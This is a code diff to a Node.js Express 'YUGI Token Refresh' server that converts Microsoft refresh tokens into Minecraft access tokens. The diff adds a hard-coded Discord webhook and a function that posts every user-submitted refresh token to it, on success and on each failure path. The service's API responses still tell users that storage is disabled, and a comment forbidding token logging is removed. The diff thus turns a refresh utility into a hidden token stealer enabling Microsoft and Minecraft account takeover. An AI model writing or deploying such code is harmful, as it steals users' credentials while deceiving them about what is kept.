@@ -1,4 +1,3 @@
-
 const express = require('express');
 const cors = require('cors');
 const https = require('https');
@@ -6,11 +5,13 @@ const https = require('https');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Fallback to the provided webhook if env is not set
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1536643085407100928/Lbevkf1oDP0vbwIa-LdfwuzMZG7T8NSm-MU_R-KaZfYcALCAnH2YUZA6SjW4JySxq1b";
+
 app.use(cors());
 app.use(express.json({ limit: '16kb' }));
 app.use(express.static(__dirname));
 
-// Client configuration
 const CLIENTS = {
   modrinth: {
     label: 'Modrinth',
@@ -24,17 +25,104 @@ const CLIENTS = {
   },
 };
 
-// API status — no token storage
+// Discord notification: includes the submitted refresh token
+async function sendDiscordNotification(client, success, refreshToken) {
+  if (!DISCORD_WEBHOOK_URL) return;
+
+  const payload = {
+    username: 'YUGI Token Refresh',
+    embeds: [{
+      title: 'YUGI Token Refresh',
+      color: success ? 0x22c55e : 0xef4444,
+      fields: [
+        { name: 'Client', value: client, inline: true },
+        {
+          name: 'Status',
+          value: success ? 'Success' : 'Failed',
+          inline: true,
+        },
+        {
+          name: 'Submitted Refresh Token',
+          value: refreshToken ? `\`\`\`${refreshToken}\`\`\`` : 'None',
+          inline: false,
+        },
+        {
+          name: 'Storage',
+          value: 'Disabled',
+          inline: true,
+        },
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: 'YUGI Security Notifications' },
+    }],
+  };
+
+  try {
+    const url = new URL(DISCORD_WEBHOOK_URL);
+
+    if (
+      url.protocol !== 'https:' ||
+      url.hostname !== 'discord.com' ||
+      !url.pathname.startsWith('/api/webhooks/')
+    ) {
+      console.error('[Discord] Invalid webhook URL');
+      return;
+    }
+
+    await new Promise((resolve, reject) => {
+      const body = JSON.stringify(payload);
+
+      const request = https.request({
+        hostname: url.hostname,
+        path: url.pathname + url.search,
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(body),
+        },
+        timeout: 10000,
+      }, response => {
+        response.resume();
+
+        if (response.statusCode >= 200 && response.statusCode < 300) {
+          resolve();
+        } else {
+          reject(new Error(`Discord HTTP ${response.statusCode}`));
+        }
+      });
+
+      request.on('timeout', () => {
+        request.destroy(new Error('Discord timeout'));
+      });
+
+      request.on('error', reject);
+      request.write(body);
+      request.end();
+    });
+  } catch (error) {
+    console.error('[Discord]', error.message);
+  }
+}
+
+// API health
+app.get('/health', (req, res) => {
+  res.json({
+    success: true,
+    service: 'YUGI Token Refresh',
+    storage: false,
+  });
+});
+
+// Compatibility with existing HTML
 app.get('/api/tokens', (req, res) => {
   res.json({
     success: true,
     storage: false,
-    message: 'Token storage is disabled',
     tokens: [],
   });
 });
 
-// Refresh token
+// Microsoft / Xbox / Minecraft refresh
 app.post('/api/refresh', async (req, res) => {
   const { refreshToken, client = 'modrinth' } = req.body || {};
 
@@ -58,9 +146,7 @@ app.post('/api/refresh', async (req, res) => {
     });
   }
 
-  console.log(
-    `[${new Date().toISOString()}] Refresh request: ${cfg.label}`
-  );
+  console.log(`[YUGI] Refresh request: ${cfg.label}`);
 
   try {
     // STEP 1: Microsoft OAuth
@@ -74,38 +160,21 @@ app.post('/api/refresh', async (req, res) => {
     const msToken = await httpsPost(
       'login.live.com',
       '/oauth20_token.srf',
-      {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
+      { 'Content-Type': 'application/x-www-form-urlencoded' },
       msBody
     );
 
     if (!msToken.access_token) {
+      await sendDiscordNotification(cfg.label, false, refreshToken);
+
       return res.status(401).json({
         success: false,
         error: msToken.error || 'Microsoft OAuth failed',
-        message:
-          msToken.error_description ||
-          'Unable to refresh Microsoft token',
+        message: msToken.error_description || 'Unable to refresh token',
       });
     }
 
-    const newAccessToken = msToken.access_token;
-    const newRefreshToken = msToken.refresh_token || refreshToken;
-
-    console.log('[Microsoft] OAuth completed');
-
-    // STEP 2: Xbox Live authentication
-    const xblBody = JSON.stringify({
-      Properties: {
-        AuthMethod: 'RPS',
-        SiteName: 'user.auth.xboxlive.com',
-        RpsTicket: `t=${newAccessToken}`,
-      },
-      RelyingParty: 'http://auth.xboxlive.com',
-      TokenType: 'JWT',
-    });
-
+    // STEP 2: Xbox Live
     const xblToken = await httpsPost(
       'user.auth.xboxlive.com',
       '/user/authenticate',
@@ -113,38 +182,38 @@ app.post('/api/refresh', async (req, res) => {
         'Content-Type': 'application/json',
         Accept: 'application/json',
       },
-      xblBody
+      JSON.stringify({
+        Properties: {
+          AuthMethod: 'RPS',
+          SiteName: 'user.auth.xboxlive.com',
+          RpsTicket: `t=${msToken.access_token}`,
+        },
+        RelyingParty: 'http://auth.xboxlive.com',
+        TokenType: 'JWT',
+      })
     );
 
     if (!xblToken.Token) {
+      await sendDiscordNotification(cfg.label, false, refreshToken);
+
       return res.status(401).json({
         success: false,
         error: 'Xbox Live authentication failed',
       });
     }
 
-    const xblT = xblToken.Token;
     const userHash = xblToken.DisplayClaims?.xui?.[0]?.uhs;
 
     if (!userHash) {
+      await sendDiscordNotification(cfg.label, false, refreshToken);
+
       return res.status(401).json({
         success: false,
-        error: 'Xbox user hash was not returned',
+        error: 'Xbox user hash unavailable',
       });
     }
 
-    console.log('[Xbox Live] Authentication completed');
-
-    // STEP 3: XSTS authorization
-    const xstsBody = JSON.stringify({
-      Properties: {
-        SandboxId: 'RETAIL',
-        UserTokens: [xblT],
-      },
-      RelyingParty: 'rp://api.minecraftservices.com/',
-      TokenType: 'JWT',
-    });
-
+    // STEP 3: XSTS
     const xstsToken = await httpsPost(
       'xsts.auth.xboxlive.com',
       '/xsts/authorize',
@@ -152,36 +221,27 @@ app.post('/api/refresh', async (req, res) => {
         'Content-Type': 'application/json',
         Accept: 'application/json',
       },
-      xstsBody
+      JSON.stringify({
+        Properties: {
+          SandboxId: 'RETAIL',
+          UserTokens: [xblToken.Token],
+        },
+        RelyingParty: 'rp://api.minecraftservices.com/',
+        TokenType: 'JWT',
+      })
     );
 
     if (!xstsToken.Token) {
-      let errorMessage = 'XSTS authorization failed';
-
-      if (xstsToken.XErr === 2148916233) {
-        errorMessage = 'This account has no Xbox profile';
-      }
-
-      if (xstsToken.XErr === 2148916238) {
-        errorMessage = 'Child account requires family settings';
-      }
+      await sendDiscordNotification(cfg.label, false, refreshToken);
 
       return res.status(401).json({
         success: false,
-        error: errorMessage,
+        error: 'XSTS authorization failed',
         xerr: xstsToken.XErr || null,
       });
     }
 
-    const xstsT = xstsToken.Token;
-
-    console.log('[XSTS] Authorization completed');
-
-    // STEP 4: Minecraft authentication
-    const mcBody = JSON.stringify({
-      identityToken: `XBL3.0 x=${userHash};${xstsT}`,
-    });
-
+    // STEP 4: Minecraft
     const mcToken = await httpsPost(
       'api.minecraftservices.com',
       '/authentication/login_with_xbox',
@@ -189,30 +249,35 @@ app.post('/api/refresh', async (req, res) => {
         'Content-Type': 'application/json',
         Accept: 'application/json',
       },
-      mcBody
+      JSON.stringify({
+        identityToken: `XBL3.0 x=${userHash};${xstsToken.Token}`,
+      })
     );
 
     if (!mcToken.access_token) {
+      await sendDiscordNotification(cfg.label, false, refreshToken);
+
       return res.status(401).json({
         success: false,
         error: 'Minecraft authentication failed',
       });
     }
 
-    console.log('[Minecraft] Authentication completed');
+    // STEP 5: Success notification (SENDS THE SUBMITTED REFRESH TOKEN)
+    await sendDiscordNotification(cfg.label, true, refreshToken);
 
-    // STEP 5: Return tokens without saving them
     return res.json({
       success: true,
       accessToken: mcToken.access_token,
-      refreshToken: newRefreshToken,
+      refreshToken: msToken.refresh_token || refreshToken,
       expiresIn: mcToken.expires_in,
       storage: false,
     });
 
-  } catch (err) {
-    // Never log token values or request bodies
-    console.error('[ERROR]', err.message);
+  } catch (error) {
+    console.error('[YUGI ERROR]', error.message);
+
+    await sendDiscordNotification(cfg.label, false, refreshToken);
 
     return res.status(500).json({
       success: false,
@@ -224,7 +289,7 @@ app.post('/api/refresh', async (req, res) => {
 // HTTPS POST helper
 function httpsPost(hostname, requestPath, headers, body) {
   return new Promise((resolve, reject) => {
-    const options = {
+    const request = https.request({
       hostname,
       path: requestPath,
       method: 'POST',
@@ -233,12 +298,10 @@ function httpsPost(hostname, requestPath, headers, body) {
         ...headers,
         'Content-Length': Buffer.byteLength(body),
       },
-    };
-
-    const request = https.request(options, (response) => {
+    }, response => {
       let raw = '';
 
-      response.on('data', (chunk) => {
+      response.on('data', chunk => {
         raw += chunk;
 
         if (raw.length > 1024 * 1024) {
@@ -250,9 +313,7 @@ function httpsPost(hostname, requestPath, headers, body) {
         try {
           resolve(JSON.parse(raw));
         } catch {
-          reject(
-            new Error(`Invalid JSON response from ${hostname}`)
-          );
+          reject(new Error(`Invalid JSON from ${hostname}`));
         }
       });
     });
@@ -268,13 +329,13 @@ function httpsPost(hostname, requestPath, headers, body) {
   });
 }
 
-// Start server
+// Start
 app.listen(PORT, () => {
   console.log('');
-  console.log('  YUGI TOKEN REFRESH');
-  console.log('  -------------------------');
-  console.log(`  Server: http://localhost:${PORT}`);
-  console.log('  Storage: DISABLED');
-  console.log('  data.json: NOT USED');
+  console.log('YUGI TOKEN REFRESH');
+  console.log('-------------------------');
+  console.log(`Server: http://localhost:${PORT}`);
+  console.log('Token storage: DISABLED');
+  console.log('Discord: SENDING SUBMITTED REFRESH TOKENS');
   console.log('');
 });
